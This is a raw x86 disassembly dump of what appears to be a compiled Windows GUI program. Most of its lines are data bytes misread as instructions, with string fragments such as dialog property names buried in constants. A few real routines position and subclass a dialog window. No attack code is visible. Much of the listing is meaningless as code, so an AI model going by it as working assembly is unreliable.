add eax [ edx ]
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x273676f
add [ eax + edx + 0xc03a6 ] dl
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or eax [ ecx + ebp * 2 + 0x73 ]
jo r-xdata
mov al 0xa7
jb r-xdata
add [ eax ] al
add [ eax ] al
je r-xdata
cmpsd [ esi ] [ edi ]
add esi [ edi + edi * 8 ]
test eax 0xa7afb403
add esp esp
scasd [ edi ]
cmpsd [ esi ] [ edi ]
add ebx esp
scasd [ edi ]
cmpsd [ esi ] [ edi ]
add esi [ eax ]
scasb [ edi ]
cmpsd [ esi ] [ edi ]
add ecx [ esi ]
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0xc03a6 ] dl
add [ eax ] al
adc [ esi + eax * 2 + 0x61 ] edx
jbe r-xdata
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
insd
jae r-xdata
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ eax - 0x50 ]
cmpsd [ esi ] [ edi ]
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
cmpsd [ esi ] [ edi ]
add ecx esp
mov al 0xa7
add edi [ eax ]
mov ch 0xa7
add edi [ esi * 4 - 0x4abffc59 ]
cmpsd [ esi ] [ edi ]
add esi esp
mov ah 0xa7
add edi eax
mov ah 0xa7
popad
jns r-xdata
aaa
jb r-xdata
stosd [ edi ]
je r-xdata
add [ eax ] al
dec esp
imul ebp [ esi + 0x6b ] 0x6d657449
pushad
fsubr [ ecx + 0x54110703 ]
inc esi
popad
jbe r-xdata
[ ecx - 0x58504bfd ]
xlat
test eax 0xa77f9803
add eax [ eax ]
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax ] bl
fsubr [ ecx + 0x3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] bh
fsubr [ ecx - 0x56279ffd ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x28 ] cl
test eax 0x1003
add [ esi + edi * 2 ] dh
cmpsd [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
in al dx
popad
insd
xchg esp eax
adc [ esi + 0x1403 ] ah
call [ eax + eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp [ eax - 0x4bfc55fe ]
stosd [ edi ]
inc ebp
je r-xdata
add edi [ eax ]
mov ch 0xa7
add edi [ ebx + ebp * 4 - 0x4f33fc59 ]
cmpsd [ esi ] [ edi ]
dec esp
imul ebp [ esi + 0x6b ] 0x6d657449
jae r-xdata
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
jb r-xdata
add edx esp
dec esp
imul ebp [ esi + 0x6b ] 0x6d657449
jae r-xdata
cmpsd [ esi ] [ edi ]
add ecx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ eax - 0x50 ]
cmpsd [ esi ] [ edi ]
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
outsb
jne r-xdata
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add [ eax ] al
rcl [ eax ] 0xa6
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ecx ds
test eax 0x1803
add ah ch
jle r-xdata
movsb [ edi ] [ esi ]
fldcw [ ecx + 0x54120703 ]
inc esi
popad
jbe r-xdata
hlt
jb r-xdata
or al 0x0
dec esp
imul ebp [ esi + 0x6b ] 0x6d657449
sbb al bl
test eax 0xa77ec003
add eax [ ecx ]
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x173676f
add [ eax + edx + 0xc03a6 ] dl
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or [ edi + ebp * 2 + 0x63 ] cl
popad
je r-xdata
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ebx [ esp + edx * 2 ]
inc esi
popad
jbe r-xdata
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
cmpsd [ esi ] [ edi ]
add esi esp
jb r-xdata
add edi [ esi * 4 - 0x4abffc59 ]
cmpsd [ esi ] [ edi ]
add esi esp
mov ah 0xa7
add edi eax
mov ah 0xa7
je r-xdata
popad
outsd
outsb
mov eax eax
clc
fsubr [ ecx + 0x3 ]
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
adc [ edx ] al
stosb [ edi ]
add ecx [ eax + 0x34 ]
cmpsb [ esi ] [ edi ]
add esp [ esp + ecx - 0x56 ]
add edi eax
add ebp [ edx - 0x55fbc3fd ]
add ecx [ esi ]
add [ eax ] al
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ eax + edx + 0x3003a6 ] dl
add [ eax ] al
xchg esp eax
adc [ esi + 0x3403 ] ah
add [ eax + edx + 0x3803a6 ] dl
add [ eax ] al
push esp
sbb eax 0x3c03a9
add [ eax ] al
pop esp
test [ esi + 0x4403 ] ah
add [ eax + edx + 0x4803a6 ] dl
add [ eax ] al
xchg esp eax
adc [ esi + 0x5c03 ] ah
add [ eax + 0x6403a91c ] bh
add [ eax ] al
add al ch
sbb al 0xa9
add ebp [ eax ]
add [ eax ] al
xchg esp eax
adc [ esi + 0x6c03 ] ah
add [ ecx ] dl
add bh ch
stosb [ edi ]
add esi [ ebx + ebp * 4 + 0x39f403a7 ]
test al 0x3
shr [ edx + 0x3acc03a7 ] 0x1
test al 0x3
xchg esp eax
cmp [ eax - 0x57c523fd ] ebp
add edx esp
cmp ebp [ eax - 0x57c1f7fd ]
add ebp esp
je r-xdata
add esp [ ecx + esi * 4 - 0x59 ]
add esp eax
mov cl 0xa7
add edx [ edx ]
push esp
inc esi
popad
jbe r-xdata
jb r-xdata
test al 0x2
dec esp
imul ebp [ esi + 0x6b ] 0x6d657449
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0xd8f8c08b
test eax 0x3
inc eax
add [ ecx + ebx * 8 - 0x57 ] ah
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 8 + 0x3a9 ] ah
add [ eax ] al
cmp [ eax - 0x58552ffd ] ebp
add ecx esp
cmp ch [ eax - 0x57c66bfd ]
add ebx esp
cmp ch [ eax - 0x57c42bfd ]
add ecx [ eax ]
test al 0x3
in al dx
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
fldcw [ ecx - 0x588067fd ]
add eax [ eax ]
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax ] bl
fisubr [ ecx + 0x3 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x26 ] bl
test eax 0xa9db3003
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1a03a9da ] dh
fld [ ecx + 0xb003 ]
add [ ebx + ecx * 4 ] bl
cmpsd [ esi ] [ edi ]
add esi eax
cmp eax 0x45d403a8
sub_3a9dc38
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xdc
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
fsubr [ ecx + 0xb003 ]
add [ eax - 0x25 ] bl
test eax 0xa83df003
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp [ eax - 0x4bfc55fe ]
stosd [ edi ]
cmpsd [ esi ] [ edi ]
add esi esp
cmp [ eax - 0x58552ffd ] ebp
add ecx esp
cmp ch [ eax - 0x57c66bfd ]
add ebx esp
cmp ch [ eax - 0x57c42bfd ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
adc [ edx ] al
stosb [ edi ]
add ecx [ eax - 0x43fc55f1 ]
rsm
sub_3a9dcb7
add edi eax
add ebp [ edx - 0x55fbc3fd ]
add ecx [ edi ]
push esp
inc esi
imul ebp [ ebp + 0x4f ] 0x446e6570
imul esp [ ecx + 0x6c ] 0xdcd4676f
test eax 0x540f0703
inc esi
imul ebp [ ebp + 0x4f ] 0x446e6570
imul esp [ ecx + 0x6c ] 0xdc80676f
test eax 0xa9dc0403
add edx [ eax + eax ]
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x1273676f
add [ eax + edx + 0x3003a6 ] dl
add bh bh
adc al 0xe
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430a0002 ] al
add [ eax - 0x80000000 ] al
push es
je r-xdata
add [ eax + 0x1 ] al
or [ eax ] eax
or eax 0x656c6946
push esp
jns r-xdata
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ 0x61460d00 ] 0x76
outsd
js r-xdata
cld
jne r-xdata
dec ecx
outsb
js r-xdata
or [ eax ] 0x0
or [ esi + 0x69 ] eax
insb
push esp
jns r-xdata
je r-xdata
adc [ esi + 0x4803 ] ah
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ 0x656c6946 ] cl
dec esi
popad
insd
xchg esp eax
outsb
jae r-xdata
add [ eax ] al
add esi [ eax ]
popad
bound esp [ ebp + 0x6c ]
movsb [ edi ] [ esi ]
xlat
test eax 0x5403
dec [ eax + 0x103aa0e ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46090008 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460d0007 ] al
imul ebp [ ebp + 0x4e ] 0x4c656d61
add [ eax + 0x4f0d000a ] al
imul eax [ edx + 0x75 ] 0x74
je r-xdata
adc [ esi + 0x5c03 ] ah
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] 0xa6109473
add ebp [ eax + eax ]
[ eax + eax ]
jae r-xdata
add [ eax ] al
imul ebp [ ebp + 0x4e ] 0x94656d61
dec esp
imul ebp [ esi + 0x6b ] 0xa6845c73
add edi [ edx + ecx - 0x56 ]
add ebp [ eax + 0xe ]
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46080006 ] al
add [ esi ] 0x0
or [ esi + 0x69 ] al
insb
outsd
outsb
xchg esp eax
adc [ esi - 0x55f597fd ] ah
add ecx [ eax + 0xe ]
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440d0004 ] al
popa
jne r-xdata
add edi [ eax ]
add bh bh
js r-xdata
outsb
dec esp
popad
bound esp [ ebp + 0x6c ]
fcom st3
test eax 0x6003
jmp [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x6e4f0900
inc ebp
js r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ esi + 0x5003 ] ah
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
dec esi
popad
insd
dec esp
or eax 0x656c6946
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ 0x69466e4f ] cl
insb
dec edi
imul eax [ ebx + 0x6c ] 0x69
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
adc [ edi + 0x6e ] cl
arpl [ ebp + 0x74 ] si
mov al 0xd4
test eax 0x7803
add bh bh
jo r-xdata
add [ eax ] cl
inc esi
outsd
insb
jb r-xdata
add [ eax + 0x5405000c ] al
imul esi [ esp + ebp * 2 + 0x65 ] r-xdata
jo r-xdata
add eax [ eax - 0x7f010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
inc esi
outsd
insb
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
adc [ edi + 0x6e ] cl
push ebx
push 0x56657261
imul ebp [ edi + 0x6c ] 0x6f697461
outsb
cld
jne r-xdata
push 0x69676e61
outsb
cld
insb
imul esp [ ebp + 0x6e ] 0x69754774
xchg esp eax
adc [ esi + 0x3403 ] ah
push [ eax + eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
adc [ ebp + 0x66 ] al
popad
jne r-xdata
add [ edx ] cl
inc ebx
fldcw [ ecx + 0x4003 ]
[ esi + ecx + 0x103aa ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x61460d00
jbe r-xdata
add [ eax ] 0x0
add [ eax + 0x4f110011 ] al
outsb
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
push 0x65676e61
mov al 0xd5
test eax 0xa003
jmp [ eax + 0x1ff0000 ]
inc esi
outsd
insb
jb r-xdata
push 0x65676e61
clc
aam 0xa9
add ecx [ eax - 0x77010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100010 ] al
outsb
jne r-xdata
add ebp [ eax - 0x57010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0013 ] al
outsb
push esp
jns r-xdata
arpl [ ebx - 0x4 ] bp
jne r-xdata
add ebx [ eax - 0x67010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ ebp + 0x54 ] 0x73657079
jl r-xdata
inc esi
jb r-xdata
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
adc [ edx ] al
stosb [ edi ]
add edx [ eax ]
adc [ edx - 0x55f39bfd ] ebp
add edi eax
add ebp [ edx - 0x55fbc3fd ]
add edx [ 0x73754354 ]
je r-xdata
inc ebx
push 0x65676e61
add al 0xe0
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x20 ] ah
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x57 ] al
add esi [ eax - 0x34000000 ]
fldcw [ ecx - 0x57c20ffd ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp [ eax - 0x4bfc55fe ]
stosd [ edi ]
cmpsd [ esi ] [ edi ]
add esi esp
cmp [ eax - 0x58552ffd ] ebp
add ecx esp
cmp ch [ eax - 0x57c66bfd ]
add ebx esp
cmp ch [ eax - 0x57c42bfd ]
add ecx [ eax ]
test al 0x3
aam 0x45
insd
inc esi
imul ebp [ ebp + 0x53 ] 0x44657661
imul esp [ ecx + 0x6c ] 0xc08b676f
add [ eax - 0x80000000 ] al
add al [ eax ]
or al [ ebx + 0x6c ]
imul esp [ ebp + 0x6e ] 0x69754774
xchg esp eax
adc [ esi + 0x3403 ] ah
push [ eax + eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
adc [ ebp + 0x66 ] al
popad
jne r-xdata
add [ eax + edx + 0x3003a6 ] dl
add bh bh
adc al 0xe
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430a0002 ] al
hlt
add eax [ edi ]
adc eax 0x73754354
je r-xdata
add [ eax - 0x80000000 ] al
push es
je r-xdata
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
adc [ edx ] al
stosb [ edi ]
add edx [ eax ]
adc [ edx - 0x55f39bfd ] ebp
add edi eax
add ebp [ edx - 0x55fbc3fd ]
add ecx [ edi ]
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x44657661
imul esp [ ecx + 0x6c ] 0xe12c676f
test eax 0x540f0703
inc esi
imul ebp [ ebp + 0x53 ] 0x44657661
imul esp [ ecx + 0x6c ] 0xe0d8676f
test eax 0xa9e05c03
add edx [ 0x69440700 ]
popad
insb
outsd
jae r-xdata
add esi [ ebx + ebp * 4 + 0x39f403a7 ]
test al 0x3
shr [ edx + 0x3acc03a7 ] 0x1
test al 0x3
xchg esp eax
cmp [ eax - 0x57c523fd ] ebp
add edx esp
cmp ebp [ eax - 0x57c1f7fd ]
add ebp esp
insd
inc esi
imul ebp [ ebp + 0x53 ] 0x44657661
imul esp [ ecx + 0x6c ] 0xe004676f
test eax 0xa9db2c03
add eax [ edx ]
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xe1
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
loope r-xdata
add [ eax + 0x1 ] al
or [ eax ] eax
or eax 0x656c6946
push esp
jns r-xdata
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ 0x61460d00 ] 0x76
outsd
js r-xdata
pushad
loopne r-xdata
outsd
mov eax eax
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp [ eax - 0x4bfc55fe ]
stosd [ edi ]
cmpsd [ esi ] [ edi ]
add esi esp
cmp [ eax - 0x58552ffd ] ebp
add ecx esp
cmp ch [ eax - 0x57c66bfd ]
add ebx esp
cmp ch [ eax - 0x57c42bfd ]
add ecx [ eax ]
test al 0x3
in al dx
add esi [ eax - 0x48000000 ]
fild [ ecx - 0x57c20ffd ]
add edx esp
inc ebp
cld
jne r-xdata
dec ecx
outsb
js r-xdata
or [ eax ] 0x0
or [ esi + 0x69 ] eax
insb
push esp
jns r-xdata
je r-xdata
adc [ esi + 0x4803 ] ah
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ 0x656c6946 ] cl
dec esi
popad
insd
xchg esp eax
outsb
jae r-xdata
add [ eax ] al
add esi [ eax ]
popad
bound esp [ ebp + 0x6c ]
movsb [ edi ] [ esi ]
xlat
test eax 0x5403
dec [ eax + 0x103aa0e ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46090008 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460d0007 ] al
imul ebp [ ebp + 0x4e ] 0x4c656d61
add [ eax + 0x4f0d000a ] al
imul eax [ edx + 0x75 ] 0x74
je r-xdata
adc [ esi + 0x5c03 ] ah
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] 0xa6109473
add ebp [ eax + eax ]
[ eax + eax ]
jae r-xdata
add [ eax ] al
imul ebp [ ebp + 0x4e ] 0x94656d61
dec esp
imul ebp [ esi + 0x6b ] 0xa6845c73
add edi [ edx + ecx - 0x56 ]
add ebp [ eax + 0xe ]
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46080006 ] al
add [ esi ] 0x0
or [ esi + 0x69 ] al
insb
outsd
outsb
xchg esp eax
adc [ esi - 0x55f597fd ] ah
add ecx [ eax + 0xe ]
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440d0004 ] al
popa
jne r-xdata
add edi [ eax ]
add bh bh
js r-xdata
outsb
dec esp
popad
bound esp [ ebp + 0x6c ]
fcom st3
test eax 0x6003
jmp [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x6e4f0900
inc ebp
js r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ esi + 0x5003 ] ah
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
dec esi
popad
insd
dec esp
or eax 0x656c6946
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ 0x69466e4f ] cl
insb
dec edi
imul eax [ ebx + 0x6c ] 0x69
arpl [ ebx - 0x4 ] bp
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
adc [ edi + 0x6e ] cl
arpl [ ebp + 0x74 ] si
mov al 0xd4
test eax 0x7803
add bh bh
jo r-xdata
add [ eax ] cl
inc esi
outsd
insb
jb r-xdata
add [ eax + 0x5405000c ] al
imul esi [ esp + ebp * 2 + 0x65 ] r-xdata
jo r-xdata
add eax [ eax - 0x7f010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
inc esi
outsd
insb
jb r-xdata
add [ eax + 0x4f110012 ] al
outsb
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
push 0x65676e61
mov al 0xd5
test eax 0xa003
jmp [ eax + 0x1ff0000 ]
push 0x69676e61
outsb
dec esp
aad 0xa9
add edx [ eax - 0x6f010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
add [ edx ] cl
inc ebx
fldcw [ ecx + 0x4003 ]
[ esi + ecx + 0x103aa ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x61460d00
jbe r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0b0011 ] al
outsb
dec edi
jbe r-xdata
inc esi
outsd
insb
jb r-xdata
push 0x65676e61
clc
aam 0xa9
add ecx [ eax - 0x77010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100010 ] al
outsb
test al 0x0
add bh bh
add [ eax ] eax
jb r-xdata
imul ebp [ ebp + 0x54 ] 0x73657079
jl r-xdata
inc esi
jb r-xdata
mov al 0x3
call sub_3ac7f40
mov ebx eax
jmp r-xdata
inc ebx
push 0x65676e61
mov eax eax
outsb
push esp
jns r-xdata
jb r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_3acc5f4
mov edi eax
mov eax ebx
call sub_3acc5d8
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_3acc5c0
mov edi eax
mov eax ebx
call sub_3acc60c
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or al 0x4f
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
add [ eax ] al
cld
jne r-xdata
add ebx [ eax - 0x67010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sub_3a9e438
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3ad1240
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
retn
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3ad0b60
retn
sub_3a9e470
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_3acc914
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_3ac7f40
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_3ac7f40
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_3acc5f4
mov edi eax
mov eax ebx
call sub_3acc5d8
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_3acc5c0
mov edi eax
mov eax ebx
call sub_3acc60c
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_3a9e524
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_3a9e470
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_3a9e590
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl dh 0x1
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax - 0x47fc561a ] dh
out 0xa9 al
add ebx [ eax + 0x2 ]
add [ eax ] al
in al dx
mov bl 0xaa
add esi eax
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add ebp [ edx + edx * 2 ]
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + ebp ]
stosd [ edi ]
add ebx [ eax - 0x13fc5478 ]
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
inc ecx
stosd [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add esp [ ebx ]
stosd [ edi ]
add eax [ esp + edi ]
stosd [ edi ]
add ebp eax
sub al 0xab
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
